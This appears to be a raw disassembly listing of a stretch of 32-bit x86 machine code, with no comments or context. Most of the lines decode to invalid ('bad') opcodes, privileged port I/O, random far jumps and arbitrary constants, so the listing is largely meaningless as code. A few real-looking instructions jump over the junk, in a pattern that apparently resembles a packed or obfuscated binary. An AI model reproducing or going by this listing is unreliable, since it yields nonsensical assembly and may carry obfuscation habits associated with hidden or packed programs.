  4100fd:	sbb    eax,0x885660ba
  410102:	push   ebx
  410103:	push   ebp
  410104:	shl    DWORD PTR [ecx+0x116c28b9],1
  41010a:	cmp    BYTE PTR [esi+ebx*1],bl
  41010d:	in     eax,0x3c
  41010f:	inc    esp
  410110:	jmp    0x6c9ea12d
  410115:	adc    eax,0x2b7ab49f
  41011a:	loopne 0x4100ab
  41011c:	div    DWORD PTR [ebx]
  41011e:	mov    ecx,0xb44a31ab
  410123:	daa    
  410124:	aam    0xf3
  410126:	retf   0x5e69
  410129:	(bad)  ds:0x3166ea66
  41012f:	shl    DWORD PTR [edx+0x597d1255],1
  410135:	push   esp
  410136:	push   ebx
  410137:	push   esi
  410138:	cmp    ebx,esi
  41013a:	pusha  
  41013b:	dec    ebp
  41013c:	push   ecx
  41013d:	(bad)  
  41013e:	(bad)  
  41013f:	icebp  
  410140:	sbb    dl,0xd2
  410143:	xor    al,0x29
  410145:	mov    ds:0x345d1252,eax
  41014a:	retf   0x230b
  41014d:	pop    ds
  41014e:	ret    
  41014f:	and    eax,0x430a7097
  410154:	xor    DWORD PTR [edx],edx
  410156:	lods   eax,DWORD PTR ds:[esi]
  410157:	cmp    DWORD PTR [edi],esi
  410159:	pop    ebx
  41015a:	xor    ecx,ebp
  41015c:	mov    bl,0xa4
  41015e:	mov    eax,ds:0xb707b849
  410163:	jb     0x410167
  410165:	cmp    al,0xd4
  410167:	dec    ebp
  410168:	jns    0x4100fb
  41016a:	add    bl,BYTE PTR [esi]
  41016c:	or     al,0xb7
  41016e:	rol    DWORD PTR [esi-0x46a595d3],1
  410174:	fucomi st,st(5)
  410176:	in     al,dx
  410177:	shl    DWORD PTR [eax+0x3cf3179c],0x2f
  41017e:	fimul  WORD PTR [esi+edi*8+0x4e]
  410182:	hlt    
  410183:	fwait
  410184:	sbb    al,0x25
  410186:	ds ret 
  410188:	test   DWORD PTR [ebp-0x78],esi
  41018b:	push   0xffffffea
  41018d:	leave  
  41018e:	into   
  41018f:	or     BYTE PTR [ebx+0x7a128378],cl
  410195:	sti    
  410196:	jecxz  0x41012d
  410198:	lods   eax,DWORD PTR ds:[esi]
  410199:	test   esi,esi
  41019b:	(bad)  
  41019c:	shl    BYTE PTR [edi+0x3eff8dca],0x96
  4101a3:	mov    ebx,0x59b4656
  4101a8:	(bad)  
  4101a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101aa:	adc    eax,0x74eec4f3
  4101af:	imul   BYTE PTR [edi]
  4101b1:	pop    ds
  4101b2:	adc    al,0x31
  4101b4:	or     DWORD PTR [ebx],esp
  4101b6:	scas   al,BYTE PTR es:[edi]
  4101b7:	jbe    0x410154
  4101b9:	pop    edi
  4101ba:	inc    edx
  4101bb:	sti    
  4101bc:	iret   
  4101bd:	pop    esi
  4101be:	sbb    al,0x13
  4101c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101c2:	sub    BYTE PTR [edx],bh
  4101c4:	mov    ebx,0xa7be841d
  4101c9:	loope  0x4101e5
  4101cb:	add    esp,esi
  4101cd:	scas   eax,DWORD PTR es:[edi]
  4101ce:	call   0x5590:0x1a71a375
  4101d5:	xchg   esi,eax
  4101d6:	push   0xffffff99
  4101d8:	mov    cl,0x1b
  4101da:	fld    TBYTE PTR [edx-0x6b98e1b7]
  4101e0:	aad    0x2c
  4101e2:	dec    ecx
  4101e3:	mov    edi,0xb6d5648
  4101e8:	add    esp,DWORD PTR [ecx]
  4101ea:	out    dx,al
  4101eb:	or     bh,0x3b
  4101ee:	jno    0x41020d
  4101f0:	add    eax,0x83422d9c
  4101f5:	into   
  4101f6:	xor    edx,0x59
  4101f9:	ins    DWORD PTR es:[edi],dx
  4101fa:	or     ah,BYTE PTR [ebp-0x5f2773d5]
  410200:	jbe    0x41020b
  410202:	mov    gs,WORD PTR [edx+0x5d4bbb1d]
  410208:	ins    BYTE PTR es:[edi],dx
  410209:	mov    ss,WORD PTR [ebx]
  41020b:	sbb    DWORD PTR [ebx+edx*2],ebp
  41020e:	and    al,0xf8
  410210:	and    BYTE PTR [edi],dl
  410212:	fsubrp st(5),st
  410214:	(bad)  
  410215:	cmp    dh,BYTE PTR [ebx+eiz*4]
  410218:	sbb    DWORD PTR [edi+eax*8],ebp
  41021b:	hlt    
  41021c:	scas   eax,DWORD PTR es:[edi]
  41021d:	sub    ah,dh
  41021f:	imul   edi,edx,0xceb92f4a
  410225:	ins    DWORD PTR es:[edi],dx
  410226:	mov    ah,0x9c
  410228:	out    dx,eax
  410229:	retf   
  41022a:	je     0x410232
  41022c:	mov    BYTE PTR [ebp+ecx*2-0x33199a9f],al
  410233:	rcr    edi,cl
  410235:	mov    eax,ds:0xa73386fe
  41023a:	lock fwait
  41023c:	enter  0x5757,0x89
  410240:	push   edi
  410241:	xor    BYTE PTR ds:0x664aeec1,cl
  410247:	(bad)  
  410248:	sbb    al,0x2
  41024a:	je     0x4101d4
  41024c:	lock dec ebp
  41024e:	test   eax,0x4265bf7a
  410253:	push   edx
  410254:	add    eax,0x2105362
  410259:	cmp    eax,0x99f6b9c6
  41025e:	adc    eax,0x38c796cf
  410263:	jmp    0x8e8aee14
  410268:	xchg   ebp,eax
  410269:	and    ecx,DWORD PTR [ecx-0x4e69f67d]
  41026f:	inc    esp
  410270:	mov    cl,0xfa
  410272:	inc    edi
  410273:	test   al,0xbd
  410275:	jns    0x41023b
  410277:	in     eax,0xfb
  410279:	adc    al,0x7d
  41027b:	popf   
  41027c:	sbb    al,0x47
  41027e:	add    al,0xc1
  410280:	fbstp  TBYTE PTR [ebx+0x30cdc8a]
  410286:	sti    
  410287:	push   ecx
  410288:	mov    DWORD PTR ds:0x9a95d325,edx
  41028e:	or     dh,BYTE PTR [esi+0x4a555cc7]
  410294:	inc    esi
  410295:	pop    es
  410296:	jb     0x410276
  410298:	repz jae 0x41026c
  41029b:	test   eax,0x3f97f15
  4102a0:	lods   eax,DWORD PTR ds:[esi]
  4102a1:	outs   dx,BYTE PTR ds:[esi]
  4102a2:	adc    eax,0xdc959338
  4102a7:	add    BYTE PTR [esi+0x60277fea],ah
  4102ad:	mov    dl,0xfe
  4102af:	mov    al,0xe5
  4102b1:	stos   BYTE PTR es:[edi],al
  4102b2:	fld    DWORD PTR [ebp+0x76]
  4102b5:	sub    eax,0x753a3e79
  4102ba:	out    0x6,eax
  4102bc:	mov    al,ds:0x51cdc04e
  4102c1:	and    eax,0x236e3a71
  4102c6:	mov    edi,0xefc7db2f
  4102cb:	add    cl,BYTE PTR ds:0x487545e9
  4102d1:	mov    BYTE PTR [esi-0x54e1a704],0x21
  4102d8:	mov    WORD PTR [ebx-0x51],gs
  4102db:	dec    eax
  4102dc:	and    dl,BYTE PTR [esp+esi*4-0x32]
  4102e0:	xor    al,0xa6
  4102e2:	sar    DWORD PTR [ebx+ebp*4],1
  4102e5:	xlat   BYTE PTR ds:[ebx]
  4102e6:	mov    ebp,0x81277245
  4102eb:	aas    
  4102ec:	pop    esi
  4102ed:	dec    eax
  4102ee:	dec    ebx
  4102ef:	es std 
  4102f1:	(bad)  
  4102f2:	mov    ebp,esp
  4102f4:	mov    esp,DWORD PTR [edi-0x7c]
  4102f7:	not    ch
  4102f9:	sub    DWORD PTR [esi],ecx
  4102fb:	retf   0x6ea1
  4102fe:	xchg   esi,eax
  4102ff:	adc    BYTE PTR [ebx+0x46],cl
  410302:	stc    
  410303:	retf   
  410304:	loop   0x41031f
  410306:	scas   eax,DWORD PTR es:[edi]
  410307:	dec    ecx
  410308:	lods   eax,DWORD PTR ds:[esi]
  410309:	addr16 int 0x6c
  41030c:	icebp  
  41030d:	dec    edi
  41030e:	add    eax,0x40ad6a1d
  410313:	or     esi,ebx
  410315:	jns    0x4102b1
  410317:	ror    BYTE PTR [eax],1
  410319:	js     0x41036f
  41031b:	push   ecx
  41031c:	lds    esp,FWORD PTR [ebx]
  41031e:	(bad)  
  41031f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410320:	es gs loop 0x410371
  410324:	imul   esp,ecx,0xffffffb1
  410327:	jne    0x410315
  410329:	mov    edi,0x7e8d7f87
  41032e:	out    dx,al
  41032f:	loopne 0x41038b
  410331:	cli    
  410332:	ins    BYTE PTR es:[edi],dx
  410333:	int3   
  410334:	jge    0x410358
  410336:	jb     0x4102f5
  410338:	dec    edx
  410339:	mov    dl,0xb7
  41033b:	idiv   ah
  41033d:	pusha  
  41033e:	jae    0x410307
  410340:	int    0xac
  410342:	cwde   
  410343:	push   esi
  410344:	xor    esp,edi
  410346:	mov    ds:0xbf4c0cbe,eax
  41034b:	sub    BYTE PTR [esi+0x4a1334ae],ah
  410351:	add    eax,0x3a09ae0c
  410356:	or     eax,0x52e1a75c
  41035b:	sti    
  41035c:	stos   DWORD PTR es:[edi],eax
  41035d:	jle    0x41039c
  41035f:	xor    dh,ch
  410361:	sub    edi,DWORD PTR [ecx+eax*2]
  410364:	pop    esi
  410365:	into   
  410366:	stos   DWORD PTR es:[edi],eax
  410367:	scas   eax,DWORD PTR es:[edi]
  410368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410369:	daa    
  41036a:	addr16 mov ecx,0xffbaa115
  410370:	iret   
  410371:	(bad)  
  410372:	mov    esp,0xacc780f
  410377:	or     ebx,DWORD PTR [edx]
  410379:	sub    DWORD PTR [edx+0x3ed9fa8b],esp
  41037f:	sbb    DWORD PTR [edi],ecx
  410381:	inc    ebp
  410382:	imul   ebx,DWORD PTR [edx-0x2e5d445e],0x1d
  410389:	pop    edx
  41038a:	cld    
  41038b:	retf   0xca83
  41038e:	pop    ebx
  41038f:	in     al,0x8f
  410391:	xchg   ebx,eax
  410392:	pop    eax
  410393:	sub    eax,0x84d89be
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xd37f:0xcf6abab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	stos   BYTE PTR es:[edi],al
  4103db:	lea    ebx,[ebp+0x1498da27]
  4103e1:	and    esi,DWORD PTR [ebx+eax*1]
  4103e4:	in     eax,dx
  4103e5:	ret    
  4103e6:	add    BYTE PTR [ebp-0x38253309],bh
  4103ec:	mov    ds:0x8f6ca820,al
  4103f1:	inc    ecx
  4103f2:	ja     0x41046b
  4103f4:	out    0x8b,al
  4103f6:	ror    BYTE PTR [edx-0x67c76d],1
  4103fc:	and    eax,0xaed9ceb0
  410401:	rcr    DWORD PTR [ebx],cl
  410403:	jo     0x4103f9
  410405:	cwde   
  410406:	xchg   ecx,eax
  410407:	sahf   
  410408:	ret    0xcfd8
  41040b:	mov    ebp,0xdde20a23
  410410:	xor    al,0x37
  410412:	leave  
  410413:	out    0x27,eax
  410415:	sbb    eax,0x2ba6e3a
  41041a:	sub    ebx,DWORD PTR [esi]
  41041c:	cmp    BYTE PTR [bx+si],0xb8
  410420:	test   DWORD PTR [ecx+0x449e733a],ebx
  410426:	lods   al,BYTE PTR ds:[esi]
  410427:	mov    dh,0x3e
  410429:	int    0x5d
  41042b:	sub    BYTE PTR [edi],ch
  41042d:	push   esi
  41042e:	push   edx
  41042f:	gs aam 0x17
  410432:	sahf   
  410433:	popf   
  410434:	cwde   
  410435:	push   edi
  410436:	mov    cl,0x33
  410438:	js     0x410487
  41043a:	add    eax,0x303c5247
  41043f:	and    ebp,DWORD PTR [ebx+0x5]
  410442:	js     0x4104c0
  410444:	xor    al,0xf2
  410446:	adc    al,0x37
  410448:	adc    BYTE PTR [edi],0x20
  41044b:	dec    esp
  41044c:	pushf  
  41044d:	lods   eax,DWORD PTR ds:[esi]
  41044e:	fdiv   st,st(7)
  410450:	fiadd  WORD PTR [eax]
  410452:	lahf   
  410453:	add    al,0x85
  410455:	enter  0xec6d,0x4f
  410459:	push   edx
  41045a:	jmp    0x4103e4
  41045c:	pop    ebx
  41045d:	popf   
  41045e:	push   ss
  41045f:	xchg   esp,eax
  410460:	ins    DWORD PTR es:[edi],dx
  410461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410462:	sub    edx,ecx
  410464:	fstp   QWORD PTR [edx-0x4e928c51]
  41046a:	aaa    
  41046b:	in     eax,dx
  41046c:	(bad)  
  41046e:	sbb    BYTE PTR [ecx-0x5c],bh
  410471:	test   al,0xee
  410473:	cmp    DWORD PTR [eax-0x872dcc9],edi
  410479:	add    al,0x94
  41047b:	mov    al,0xc0
  41047d:	lods   al,BYTE PTR ds:[esi]
  41047e:	aaa    
  41047f:	or     eax,0xb06196d4
  410484:	cmp    eax,0x3edd201b
  410489:	jmp    0x95c5:0xdf174cb2
  410490:	mov    ds:0xa14c112c,eax
  410495:	adc    esi,DWORD PTR [esi+0x7b5081]
  41049b:	enter  0xa9e,0xc2
  41049f:	in     eax,0x9f
  4104a1:	cmc    
  4104a2:	xchg   DWORD PTR ds:0x9bd2cf2c,esi
  4104a8:	mov    bl,0xc6
  4104aa:	jg     0x410466
  4104ac:	call   0x43eb:0xd3bcc9ee
  4104b3:	jge    0x410480
  4104b5:	mov    ah,0x7
  4104b7:	or     cl,ch
  4104b9:	sub    al,0x7b
  4104bb:	jle    0x4104d5
  4104bd:	xchg   bh,dh
  4104bf:	in     al,dx
  4104c0:	nop
  4104c1:	fwait
  4104c2:	ret    
  4104c3:	inc    esp
  4104c4:	les    ebp,FWORD PTR [ebp+0x73fb1934]
  4104ca:	test   BYTE PTR [ecx+0xd],0x58
  4104ce:	cmp    edi,DWORD PTR [eax-0x31c0debd]
  4104d4:	scas   eax,DWORD PTR es:[edi]
  4104d5:	sbb    DWORD PTR ds:0x3f9e8a15,ebx
  4104db:	push   ebx
  4104dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104dd:	push   edi
  4104de:	dec    esi
  4104df:	cli    
  4104e0:	dec    ecx
  4104e1:	xchg   edx,eax
  4104e2:	fsubr  QWORD PTR [ebx+0x5]
  4104e5:	(bad)  
  4104e7:	in     al,0x29
  4104e9:	(bad)  [ebx]
  4104eb:	xchg   ebx,eax
  4104ec:	(bad)  
  4104ed:	cmp    al,0x9f
  4104ef:	jmp    0xadbe:0x892a5551
  4104f6:	out    0xa1,eax
  4104f8:	scas   al,BYTE PTR es:[edi]
  4104f9:	jmp    0x410546
  4104fb:	scas   al,BYTE PTR es:[edi]
  4104fc:	in     al,dx
  4104fd:	xor    edx,DWORD PTR [edi]
  4104ff:	sbb    edi,0x9
  410502:	mov    ecx,0x21d50179
  410507:	imul   edx,DWORD PTR [esi+0x2b],0x7b
  41050b:	das    
  41050c:	(bad)  
  41050d:	stos   DWORD PTR es:[edi],eax
  41050e:	adc    al,0x29
  410510:	fdiv   QWORD PTR [edx-0x8c4c704]
  410516:	test   eax,0xb8a411d
  41051b:	fsubr  DWORD PTR [esi-0x4]
  41051e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41051f:	and    BYTE PTR [ecx-0x6104e9c9],0x6
  410526:	jl     0x4104e6
  410528:	call   0x7d5d1847
  41052d:	pop    esi
  41052e:	ror    esi,1
  410530:	add    ecx,DWORD PTR [esi-0x40893283]
  410536:	aad    0xe7
  410538:	push   ebx
  410539:	fcomp  QWORD PTR [edx]
  41053b:	xchg   DWORD PTR [ebp-0x43e87d5d],eax
  410541:	cmp    al,0x4d
  410543:	dec    ebp
  410544:	shr    DWORD PTR [ebx-0x7b646058],1
  41054a:	lahf   
  41054b:	lock (bad) [ebx+0x7d447d82]
  410552:	cmp    eax,0xd72b6035
  410557:	adc    eax,0x41a0fd0e
  41055c:	rcl    DWORD PTR [ecx+ebx*8],1
  41055f:	jbe    0x4105d5
  410561:	int    0x31
  410563:	lea    eax,[edx+0x3]
  410566:	pusha  
  410567:	mov    ds:0xf35250fc,eax
  41056c:	cmc    
  41056d:	xchg   esp,eax
  41056e:	cwde   
  41056f:	je     0x4105ef
  410571:	push   eax
  410572:	enter  0xf1e5,0x17
  410576:	gs dec edi
  410578:	or     DWORD PTR ds:0x5a53fa12,ebx
  41057e:	sub    al,0xa3
  410580:	das    
  410581:	aam    0x4d
  410583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410584:	xchg   edi,eax
  410585:	add    ch,bh
  410587:	mov    edx,0x8cf2523a
  41058c:	loope  0x4105cc
  41058e:	xchg   ecx,eax
  41058f:	xor    al,0x67
  410591:	div    BYTE PTR [eax]
  410593:	mov    esp,0x614f7fae
  410598:	fstp   DWORD PTR [edi+eax*4+0x7a5540df]
  41059f:	xor    DWORD PTR [ebx-0xf],edi
  4105a2:	push   cs
  4105a3:	leave  
  4105a4:	and    edi,0x3c
  4105a7:	pop    esi
  4105a8:	sub    DWORD PTR [ebx-0x57e2c60c],0x9
  4105af:	pop    ebx
  4105b0:	xor    al,0x42
  4105b2:	and    ebp,DWORD PTR [esi]
  4105b4:	xor    al,0x66
  4105b6:	xchg   ebx,eax
  4105b7:	in     eax,0xfb
  4105b9:	inc    edx
  4105ba:	pop    ds
  4105bb:	jmp    0xdc2d634b
  4105c0:	shl    bl,0xcd
  4105c3:	outs   dx,BYTE PTR ds:[esi]
  4105c5:	lods   eax,DWORD PTR ds:[esi]
  4105c6:	out    dx,eax
  4105c7:	iret   
  4105c8:	out    0xcf,eax
  4105ca:	aas    
  4105cb:	mov    ah,0x26
  4105cd:	popf   
  4105ce:	adc    dh,BYTE PTR [eax+0x4fdcbc70]
  4105d4:	mov    DWORD PTR [ebp+eax*1+0x5a],eax
  4105d8:	loopne 0x4105d9
  4105da:	nop
  4105db:	jbe    0x41057b
  4105dd:	push   ebp
  4105de:	aas    
  4105df:	inc    ecx
  4105e0:	sbb    eax,0xa5f5cb9e
  4105e5:	gs mov al,0x8b
  4105e8:	dec    edi
  4105e9:	adc    al,0x88
  4105eb:	sub    eax,0x8c29f1c8
  4105f0:	lea    esp,[eax+0x4d]
  4105f3:	aam    0x99
  4105f5:	dec    esp
  4105f6:	out    0xf,al
  4105f8:	or     DWORD PTR [eax],ecx
  4105fa:	neg    ebp
  4105fc:	jp     0x410647
  4105fe:	xchg   ebp,eax
  4105ff:	sti    
  410600:	or     ebp,DWORD PTR ds:0x61cb3f0f
  410606:	xchg   esp,eax
  410607:	rol    BYTE PTR [ecx+0x4f],cl
  41060a:	pop    ecx
  41060b:	test   BYTE PTR [ebx],0x65
  41060e:	jl     0x410615
  410610:	pop    esp
  410611:	bound  edx,QWORD PTR [esi+0x355a5061]
  410617:	mov    al,0x8c
  410619:	push   eax
  41061a:	mov    eax,ds:0x76efa3b6
  41061f:	pushf  
  410620:	inc    ecx
  410621:	ficomp DWORD PTR [eax]
  410623:	lds    edx,FWORD PTR [eax]
  410625:	nop
  410626:	cmp    bl,dh
  410628:	inc    esp
  410629:	and    edi,DWORD PTR [ebx-0x3c]
  41062c:	fcomp  DWORD PTR [esi]
  41062e:	lahf   
  41062f:	push   eax
  410630:	xchg   BYTE PTR [edi-0x18],dl
  410633:	inc    edi
  410634:	aaa    
  410635:	(bad)  
  410636:	into   
  410637:	mov    BYTE PTR [ebp+0x2d],ch
  41063a:	dec    edx
  41063b:	movd   DWORD PTR [edi+0x14144523],mm2
  410642:	dec    ebx
  410643:	and    dl,dh
  410645:	aad    0x9
  410647:	mov    bh,0x79
  410649:	int3   
  41064a:	fldenv [ebx]
  41064c:	inc    DWORD PTR [edx-0x2e]
  41064f:	jae    0x41060a
  410651:	ret    0xbbb8
  410654:	in     al,0xec
  410656:	fwait
  410657:	outs   dx,BYTE PTR ds:[esi]
  410658:	data16 sub al,0xd8
  41065b:	or     eax,0xef655879
  410660:	adc    al,0x19
  410662:	xor    esp,DWORD PTR [ebx+0x4e]
  410665:	int    0x6c
  410667:	mov    eax,0x841593a6
  41066c:	es call 0x1e73:0xb166f4a1
  410674:	sub    DWORD PTR [esi+0x77],0x28
  410678:	imul   esi,DWORD PTR [eax],0xfa612615
  41067e:	inc    edx
  41067f:	fiadd  WORD PTR [ebp*2+0x58323900]
  410686:	mov    es,esi
  410688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410689:	or     bh,BYTE PTR [ecx]
  41068b:	dec    eax
  41068c:	mov    ebx,0xd9e69c4
  410691:	push   0xffffffa8
  410693:	test   esi,esi
  410695:	push   ecx
  410696:	or     ah,BYTE PTR [ecx]
  410698:	adc    al,0xbd
  41069a:	addr16 out 0x34,eax
  41069d:	push   ss
  41069e:	xor    DWORD PTR [ebp-0xcaedb66],0xd
  4106a5:	ret    0x3e7c
  4106a8:	rcl    BYTE PTR [eax-0x16],cl
  4106ab:	rcr    DWORD PTR [edi],cl
  4106ad:	add    edi,DWORD PTR [edx]
  4106af:	stos   BYTE PTR es:[edi],al
  4106b0:	je     0x410693
  4106b2:	test   BYTE PTR [edx-0x27d3d919],dh
  4106b8:	ror    BYTE PTR [ebp-0x149f3a41],0x49
  4106bf:	pop    ss
  4106c0:	fidiv  WORD PTR [ebx-0x11]
  4106c3:	rol    BYTE PTR [edx+ebp*4],cl
  4106c6:	popf   
  4106c7:	dec    edi
  4106c8:	sub    DWORD PTR [ebp+0x27],ebp
  4106cb:	enter  0x936b,0xe5
  4106cf:	pop    ds
  4106d0:	push   esi
  4106d1:	and    BYTE PTR [edx+0x56],ah
  4106d4:	stos   DWORD PTR es:[edi],eax
  4106d5:	xchg   BYTE PTR [edi-0x75b18bca],dh
  4106db:	pop    esi
  4106dc:	int    0xd8
  4106de:	in     eax,0xbb
  4106e0:	ret    0x4c8e
  4106e3:	or     BYTE PTR [edi],al
  4106e5:	and    ebx,DWORD PTR [esi-0xa12b7f3]
  4106eb:	mov    al,0x11
  4106ed:	mov    ebx,0x4467cc00
  4106f2:	xor    bl,dh
  4106f4:	adc    al,0xd9
  4106f7:	sub    al,0x92
  4106f9:	int    0x62
  4106fb:	fistp  DWORD PTR [esi+0x4caedf94]
  410701:	mov    cl,0xe3
  410703:	aad    0x9d
  410705:	mov    bl,0x63
  410707:	and    al,0x43
  410709:	pop    es
  41070a:	pushf  
  41070b:	sbb    dl,BYTE PTR [edi]
  41070d:	jle    0x410776
  41070f:	mov    edx,0x5d3a7a5a
  410714:	jo     0x4106d2
  410716:	push   edx
  410717:	jmp    0x1b5:0xbaf481b7
  41071e:	fadd   DWORD PTR [esi+0x75cca9fe]
  410724:	pop    ecx
  410725:	adc    eax,0xa4322e32
  41072a:	and    cl,BYTE PTR [esi]
  41072c:	jo     0x4106c9
  41072e:	push   esi
  41072f:	adc    DWORD PTR [edx-0x7c],ebx
  410732:	aas    
  410733:	push   ss
  410734:	mov    ebx,0xbb08c04b
  410739:	push   esp
  41073a:	fs int 0xd0
  41073d:	sahf   
  41073e:	js     0x410763
  410740:	std    
  410741:	ficom  DWORD PTR [edi]
  410743:	sbb    ecx,DWORD PTR [eax]
  410745:	call   0x339b:0x77cb869
  41074c:	sbb    al,0x1c
  41074e:	jl     0x41074d
  410750:	cmp    bh,BYTE PTR [esi]
  410752:	jmp    0xef6c:0x94bcbbe9
  410759:	inc    ecx
  41075a:	cmp    al,BYTE PTR [ecx+0x5bc3b902]
  410760:	outs   dx,BYTE PTR ds:[esi]
  410761:	sub    ch,BYTE PTR [ebx]
  410763:	cmp    bh,dl
  410765:	or     eax,ebx
  410767:	xchg   ebx,ebx
  410769:	div    cl
  41076b:	retf   
  41076c:	out    dx,al
  41076d:	out    dx,eax
  41076e:	cmp    DWORD PTR [edi],ecx
  410770:	ins    BYTE PTR es:[edi],dx
  410771:	cwde   
  410772:	scas   al,BYTE PTR es:[edi]
  410773:	inc    esp
  410774:	mov    esi,DWORD PTR [ebx]
  410776:	xor    eax,0x93f618e3
  41077b:	push   ds
  41077c:	fcmovu st,st(0)
  41077e:	jb     0x41073c
  410780:	in     al,0xaa
  410782:	mov    ds:0x636728cd,eax
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107a9:	adc    DWORD PTR [eax+0x19],0x7070468b
  4107b0:	mov    ds:0xf770707d,eax
  4107b5:	les    ebp,FWORD PTR [edx+0x34489968]
  4107bb:	(bad)  
  4107bc:	enter  0x8128,0x7f
  4107c0:	xlat   BYTE PTR ds:[ebx]
  4107c1:	mov    esp,DWORD PTR [eax-0x41]
  4107c4:	pop    ebx
  4107c5:	xor    DWORD PTR [edi+0x95afd38],edx
  4107cb:	scas   al,BYTE PTR es:[edi]
  4107cc:	jmp    0x410791
  4107ce:	jae    0x410777
  4107d0:	and    dl,ah
  4107d2:	(bad)  
  4107d3:	mov    ch,0x37
  4107d5:	enter  0x5549,0xac
  4107d9:	fucom  st(3)
  4107db:	push   cs
  4107dc:	pop    esp
  4107dd:	test   al,0x8b
  4107df:	shl    BYTE PTR [edi-0x38dedb83],cl
  4107e5:	jne    0x4107ac
  4107e7:	dec    edx
  4107e8:	test   ebx,edx
  4107ea:	mul    ch
  4107ec:	cs jle 0x4107b7
  4107ef:	ins    BYTE PTR es:[edi],dx
  4107f0:	into   
  4107f1:	push   ebp
  4107f2:	adc    esp,DWORD PTR [edx]
  4107f4:	xor    al,0xad
  4107f6:	xor    al,0x86
  4107f8:	inc    ecx
  4107f9:	jns    0x410839
  4107fb:	test   eax,0xd1cdf54
  410800:	jns    0x4107ba
  410802:	add    eax,0x36630b49
  410807:	lock ss out 0x11,eax
  41080b:	and    DWORD PTR [esi+0x6f59b1e0],ebx
  410811:	push   ebx
  410812:	sti    
  410813:	fadd   QWORD PTR [edi-0x62]
  410816:	lock int 0xc5
  410819:	pop    edx
  41081a:	test   eax,0x8c1e97a5
  41081f:	stos   BYTE PTR es:[edi],al
  410820:	mov    ax,ds:0x107c199
  410826:	retf   0xa0e2
  410829:	mov    esi,0x3d058b66
  41082e:	push   edi
  41082f:	out    0xaa,al
  410831:	and    eax,0x9440f057
  410836:	out    0xcc,al
  410838:	adc    eax,0x73a28c4a
  41083d:	scas   eax,DWORD PTR es:[edi]
  41083e:	cmp    al,BYTE PTR [ebx]
  410840:	jno    0x4107c4
  410842:	jg     0x410870
  410844:	out    0xa5,eax
  410846:	add    esp,ebx
  410848:	mov    ebx,DWORD PTR [esi+0x5bfe4040]
  41084e:	je     0x4108af
  410850:	or     ebp,ebx
  410852:	lock or DWORD PTR [ebx+0x440c076e],ebx
  410859:	push   ecx
  41085a:	and    DWORD PTR [ecx+0x1b9f6fff],0xffffffba
  410861:	js     0x410874
  410863:	push   cs
  410864:	les    edx,FWORD PTR [ebp-0x51]
  410867:	sbb    DWORD PTR [edi-0x5c],eax
  41086a:	test   al,0x10
  41086c:	push   0x1b2f561f
  410871:	mov    gs,edx
  410873:	dec    esp
  410874:	jp     0x410865
  410876:	lock push es
  410878:	je     0x41086e
  41087a:	loopne 0x410826
  41087c:	jg     0x4108d1
  41087e:	or     eax,0xb2cfef12
  410883:	pop    edx
  410884:	and    al,0x47
  410886:	ror    BYTE PTR [edi+0x34],cl
  410889:	lahf   
  41088a:	neg    ebx
  41088c:	xor    dl,dh
  41088e:	pop    es
  41088f:	not    DWORD PTR [edx+edi*4+0x6a]
  410893:	test   BYTE PTR [esi+0x41],ch
  410896:	(bad)  
  410897:	or     ah,BYTE PTR [esi]
  410899:	cmc    
  41089a:	jecxz  0x4108aa
  41089c:	test   eax,0xb9c895a4
  4108a1:	pop    ebp
  4108a2:	hlt    
  4108a3:	jns    0x410829
  4108a5:	add    DWORD PTR [esi+eax*1+0x79bc51b4],edi
  4108ac:	mov    ah,0x82
  4108ae:	stos   BYTE PTR es:[edi],al
  4108af:	jge    0x41092d
  4108b1:	sbb    al,0x97
  4108b3:	test   DWORD PTR [esi+eax*8-0x5c],esp
  4108b7:	std    
  4108b8:	shr    BYTE PTR [ecx],cl
  4108ba:	aam    0x2a
  4108bc:	xchg   ebp,eax
  4108bd:	jmp    0x3439:0xac12d10
  4108c4:	push   ebp
  4108c5:	scas   eax,DWORD PTR es:[edi]
  4108c6:	lods   eax,DWORD PTR ds:[esi]
  4108c7:	add    BYTE PTR [ecx-0x4fdabc41],0xae
  4108ce:	sbb    eax,0xeeb09491
  4108d4:	inc    ecx
  4108d5:	pop    es
  4108d6:	mov    ah,0x94
  4108d8:	jmp    0x4108d4
  4108da:	and    cl,al
  4108dc:	out    0xa,al
  4108de:	shl    DWORD PTR [ebp+edx*1-0x33],cl
  4108e2:	outs   dx,DWORD PTR ds:[esi]
  4108e3:	hlt    
  4108e4:	add    ebx,ebp
  4108e6:	not    BYTE PTR [esi+0x3814cb51]
  4108ec:	call   0x3012:0x928046db
  4108f3:	jg     0x410945
  4108f5:	repnz outs dx,BYTE PTR ds:[esi]
  4108f7:	dec    esp
  4108f8:	stc    
  4108f9:	ret    0x6d34
  4108fc:	jmp    0x5ae1588c
